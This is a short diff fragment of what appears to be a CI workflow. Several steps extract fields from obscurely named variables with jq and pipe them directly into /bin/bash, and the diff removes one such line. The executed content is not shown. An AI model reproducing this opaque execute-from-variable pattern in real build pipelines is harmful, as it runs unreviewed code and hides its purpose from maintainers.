@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$tb77" | jq -r .le80132 | /bin/bash
           printf '%s' "$zya8403" | jq -r .e05453 | /bin/bash
           echo $u3318 | jq -r .out438 | /bin/bash
-          printf '%s' "$sfopj99330" | jq -r .zjpq7426 | /bin/bash
           printf '%s' "$pls0356" | jq -r .f1644 | /bin/bash
 
       - name: Store artifact
